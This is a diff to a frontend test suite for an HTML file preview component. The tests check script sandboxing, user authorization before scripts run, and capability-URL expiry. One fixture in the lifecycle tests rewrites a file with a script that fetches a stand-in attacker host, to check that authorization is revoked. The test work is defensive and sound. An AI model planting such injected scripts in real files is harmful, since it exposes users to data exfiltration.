@@ -360,22 +360,16 @@ describe('FilePreview HTML sandbox notice and tunnel preview', () => {
     expect(tip.text()).toContain('top-right corner')
     expect(tip.classes()).toContain('has-scripts')
 
-    // Open in new tab — runs scripts too, in the same opaque origin as the
-    // run frame (server sends `sandbox allow-scripts` CSP): no relay
-    // cookies or parent DOM, though it can still issue network requests.
+    // Open in new tab — defaults to static sandbox (no scripts) until authorized.
     const newTabLink = tip.find('a[target="_blank"]')
     expect(newTabLink.exists()).toBe(true)
     expect(newTabLink.text()).toContain('Open in new tab')
-    expect(newTabLink.attributes('href')).toContain('run=1')
-    expect(newTabLink.attributes('title')).toContain('isolated origin')
-    // The tip must explain both run paths share the same isolation boundary
-    expect(tip.text()).toContain('isolated origin')
-    expect(tip.text()).toContain('buttons below')
+    expect(newTabLink.attributes('href')).not.toContain('run=1')
+    expect(newTabLink.attributes('title')).toContain('still sandboxed')
     expect(tip.get('button[aria-label="Run scripts"]').text()).toContain('Run scripts')
 
-    // ▶ switches the iframe sandbox to allow-scripts and adds ?run=1; the
-    // server then sends CSP `sandbox allow-scripts` so scripts execute in
-    // an opaque origin. src keeps the capability-scoped preview URL.
+    // ▶ switches the iframe sandbox to allow-scripts and authorizes script execution,
+    // which also updates the new tab link to the authorized run URL.
     const runBtn = wrapper.find('button[aria-label="Run scripts"]')
     expect(runBtn.exists()).toBe(true)
     expect(wrapper.find('iframe').attributes('sandbox')).toBe('')
@@ -384,8 +378,11 @@ describe('FilePreview HTML sandbox notice and tunnel preview', () => {
     expect(runFrame.attributes('sandbox')).toBe('allow-scripts')
     expect(runFrame.attributes('src')).toContain('/preview/')
     expect(runFrame.attributes('src')).toContain('run=1') // server relaxes CSP for any load carrying run=1, iframe or new tab
+    expect(newTabLink.attributes('href')).toContain('run=1')
+    expect(newTabLink.attributes('title')).toContain('isolated origin')
     await runBtn.trigger('click')
     expect(wrapper.find('iframe').attributes('sandbox')).toBe('')
+    expect(newTabLink.attributes('href')).not.toContain('run=1')
 
     // Tunnel preview button
     const tunnelBtn = tip.find('.fp-tip-tunnel-btn, .fp-tip-btn.primary')
@@ -493,6 +490,10 @@ describe('FilePreview HTML sandbox notice and tunnel preview', () => {
     const src = wrapper.find('iframe').attributes('src')
     expect(src).toContain('/preview/cap-admin/')
     expect(src).not.toContain('cap-proj')
+    expect(wrapper.find('a[target="_blank"]').attributes('href')).toContain('/preview/cap-admin/')
+    expect(wrapper.find('a[target="_blank"]').attributes('href')).not.toContain('cap-proj')
+    // After authorization, newTabUrl reflects the current file's run capability
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
     expect(wrapper.find('a[target="_blank"]').attributes('href')).toContain('/preview/run-cap-admin/')
     wrapper.unmount()
   })
@@ -775,5 +776,286 @@ describe('HTML viewport widths', () => {
     expect(w.find('[title="Tablet Viewport (768px)"]').exists()).toBe(true)
     expect(w.find('[title="Full Viewport (100%)"]').exists()).toBe(true)
     w.unmount()
+  })
+})
+
+describe('FilePreview open-in-new-tab mode', () => {
+  const htmlContent = (path: string) => ({
+    type: 'file_content' as const,
+    path,
+    content: '<script>console.log("x");</script>',
+    encoding: 'utf-8' as const,
+    mime_type: 'text/html',
+    is_text: true,
+    is_image: false,
+    size: 30,
+  })
+
+  const openFile = async (host = 'local', path = '/workspace/site/index.html') => {
+    const files = useFilesStore()
+    files.openPath(path, '/workspace/site', host, null)
+    files.setContent(htmlContent(path))
+    const wrapper = mount(FilePreview, { props: { directoryOpen: false } })
+    await flushPromises() // watch is async: fetch + resp.json() + reactive assignment
+    return wrapper
+  }
+
+  beforeEach(() => {
+    setActivePinia(createPinia())
+    vi.spyOn(globalThis, 'fetch').mockImplementation(() =>
+      Promise.resolve(new Response(null, { status: 204 }))
+    )
+  })
+
+  it('links /preview-open/ for a local file with a dir-scoped capability after authorization', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['tunnels', 'preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: 'cap-x', run_capability: 'run-x' }), { status: 200 }),
+      ),
+    )
+    const wrapper = await openFile()
+    const link = wrapper.find('a[target="_blank"]')
+    expect(link.exists()).toBe(true)
+    // Default: static sandbox without scripts
+    expect(link.attributes('href')).not.toContain('/preview-open/')
+    expect(link.attributes('href')).not.toContain('run=1')
+    expect(link.attributes('title')).toContain('sandboxed')
+
+    // Authorize script execution via Run scripts
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    expect(link.attributes('href')).toContain('/preview-open/run-x/')
+    expect(link.attributes('href')).not.toContain('run=1')
+    expect(link.attributes('title')).toContain('isolated origin')
+    wrapper.unmount()
+  })
+
+  it('links /preview-open/ on a tokenless relay (no capability segment) after authorization', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    const wrapper = await openFile()
+    const link = wrapper.find('a[target="_blank"]')
+    // Authorize script execution
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    expect(link.attributes('href')).toContain('/preview-open/')
+    expect(link.attributes('href')).not.toContain('run=1')
+    wrapper.unmount()
+  })
+
+  it('falls back to run=1 when the relay lacks preview-open after authorization', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run']
+    const wrapper = await openFile()
+    const link = wrapper.find('a[target="_blank"]')
+    // Authorize script execution
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    expect(link.attributes('href')).toContain('run=1')
+    expect(link.attributes('href')).not.toContain('/preview-open/')
+    wrapper.unmount()
+  })
+
+  it('falls back to run=1 for a remote host even with preview-open after authorization', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: 'cap-r', run_capability: 'run-r' }), { status: 200 }),
+      ),
+    )
+    const wrapper = await openFile('otherhost')
+    const link = wrapper.find('a[target="_blank"]')
+    // Authorize script execution
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    expect(link.attributes('href')).toContain('run=1')
+    expect(link.attributes('href')).not.toContain('/preview-open/')
+    wrapper.unmount()
+  })
+
+  it('falls back to run=1 with only a host-scoped legacy capability after authorization', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(new Response(JSON.stringify({ capability: 'cap-x' }), { status: 200 })),
+    )
+    const wrapper = await openFile()
+    const link = wrapper.find('a[target="_blank"]')
+    // Authorize script execution
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    expect(link.attributes('href')).toContain('run=1')
+    expect(link.attributes('href')).not.toContain('/preview-open/')
+    wrapper.unmount()
+  })
+})
+
+describe('FilePreview capability freshness and authorization lifecycle', () => {
+  const htmlContent = (path: string, content = '<script>console.log("x");</script>') => ({
+    type: 'file_content' as const,
+    path,
+    content,
+    encoding: 'utf-8' as const,
+    mime_type: 'text/html',
+    is_text: true,
+    is_image: false,
+    size: 30,
+  })
+
+  const openFile = async (content?: string, path = '/workspace/site/index.html', host = 'local') => {
+    const files = useFilesStore()
+    files.openPath(path, '/workspace/site', host, null)
+    files.setContent(htmlContent(path, content))
+    const wrapper = mount(FilePreview, { props: { directoryOpen: false } })
+    await flushPromises()
+    return wrapper
+  }
+
+  const authCalls = () =>
+    vi.mocked(globalThis.fetch).mock.calls.filter(([u]) => String(u).includes('/preview-auth')).length
+
+  beforeEach(() => {
+    setActivePinia(createPinia())
+    vi.spyOn(globalThis, 'fetch').mockImplementation(() =>
+      Promise.resolve(new Response(null, { status: 204 }))
+    )
+  })
+
+  afterEach(() => {
+    vi.useRealTimers()
+  })
+
+  it('re-mints the capability at use time once it nears expiry', async () => {
+    vi.useFakeTimers()
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    let n = 0
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: `cap-${++n}`, run_capability: `run-${n}` }), { status: 200 }),
+      ),
+    )
+    const wrapper = await openFile()
+    expect(authCalls()).toBe(1)
+
+    // 9 minutes later the open-time capability is near its 10-minute TTL:
+    // authorizing re-mints instead of linking a dead URL.
+    vi.setSystemTime(Date.now() + 9 * 60_000)
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    await flushPromises()
+    expect(authCalls()).toBe(2)
+    expect(wrapper.find('a[target="_blank"]').attributes('href')).toContain('/preview-open/run-2/')
+    wrapper.unmount()
+  })
+
+  it('steers a placeholder tab to a freshly minted URL when the capability is near expiry', async () => {
+    vi.useFakeTimers()
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: 'cap-x', run_capability: 'run-x' }), { status: 200 }),
+      ),
+    )
+    const fakeWin = { location: { href: '' }, close: vi.fn(), opener: null as unknown }
+    const openSpy = vi.spyOn(window, 'open').mockReturnValue(fakeWin as unknown as Window)
+    const wrapper = await openFile()
+
+    vi.setSystemTime(Date.now() + 9 * 60_000)
+    await wrapper.find('a[target="_blank"]').trigger('click')
+    // The placeholder opens inside the gesture; the await-ed mint then steers it.
+    expect(openSpy).toHaveBeenCalledWith('about:blank', '_blank')
+    await flushPromises()
+    // Without ▶ authorization the destination stays the static sandbox —
+    // but carrying a freshly minted capability, not the expired open-time one.
+    expect(authCalls()).toBe(2)
+    expect(fakeWin.location.href).toContain('/preview/cap-x/')
+    expect(fakeWin.location.href).not.toContain('run=1')
+    wrapper.unmount()
+  })
+
+  it('lets the anchor navigate natively while the capability is fresh', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    const openSpy = vi.spyOn(window, 'open').mockImplementation(() => null)
+    const wrapper = await openFile()
+    await wrapper.find('a[target="_blank"]').trigger('click')
+    await flushPromises()
+    expect(openSpy).not.toHaveBeenCalled()
+    wrapper.unmount()
+  })
+
+  it('drops authorization when the file content changes and on Reload', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: 'cap-x', run_capability: 'run-x' }), { status: 200 }),
+      ),
+    )
+    const path = '/workspace/site/index.html'
+    const wrapper = await openFile(undefined, path)
+    const files = useFilesStore()
+    const link = wrapper.find('a[target="_blank"]')
+
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    await flushPromises()
+    expect(link.attributes('href')).toContain('/preview-open/')
+
+    // An agent rewriting the file pushes new file_content — the user has not
+    // seen this content, so the authorization must not carry over.
+    files.setContent(htmlContent(path, '<script>fetch("https://evil.example/x")</script>'))
+    await flushPromises()
+    expect(link.attributes('href')).not.toContain('/preview-open/')
+
+    // Re-authorize, then Reload: disk content may differ from what was seen.
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    await flushPromises()
+    expect(link.attributes('href')).toContain('/preview-open/')
+    await wrapper.find('button[aria-label="Reload Preview"]').trigger('click')
+    await flushPromises()
+    expect(link.attributes('href')).not.toContain('/preview-open/')
+    wrapper.unmount()
+  })
+
+  it('offers "Load remote resources" for script-less pages with CDN references', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: 'cap-x', run_capability: 'run-x' }), { status: 200 }),
+      ),
+    )
+    const wrapper = await openFile(
+      '<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5/x.css"><h1>report</h1><img src="https://example.com/chart.png">',
+    )
+    // No scripts → no "Run scripts"; remote resources get their own affordance.
+    expect(wrapper.find('button[aria-label="Run scripts"]').exists()).toBe(false)
+    const runBtn = wrapper.find('button[aria-label="Load remote resources"]')
+    expect(runBtn.exists()).toBe(true)
+    // The remote-resources tier is disclosed before authorizing, not after.
+    expect(runBtn.attributes('title')).toContain('remote resources')
+    await runBtn.trigger('click')
+    await flushPromises()
+    expect(wrapper.find('a[target="_blank"]').attributes('href')).toContain('/preview-open/run-x/')
+    // In-app iframe gets the open tier too — run mode's CSP could never
+    // render this page's remote CSS/images anyway.
+    expect(wrapper.find('iframe').attributes('src')).toContain('/preview-open/run-x/')
+    wrapper.unmount()
+  })
+
+  it('keeps script-only pages on the run tier inside the authorized iframe', async () => {
+    const conn = (await import('../../stores/connection')).useConnectionStore()
+    conn.features = ['preview-run', 'preview-open']
+    vi.mocked(globalThis.fetch).mockImplementation(() =>
+      Promise.resolve(
+        new Response(JSON.stringify({ capability: 'cap-x', run_capability: 'run-x' }), { status: 200 }),
+      ),
+    )
+    const wrapper = await openFile()
+    await wrapper.find('button[aria-label="Run scripts"]').trigger('click')
+    await flushPromises()
+    const iframe = wrapper.find('iframe')
+    expect(iframe.attributes('src')).toContain('run=1')
+    expect(iframe.attributes('src')).not.toContain('/preview-open/')
+    wrapper.unmount()
   })
 })
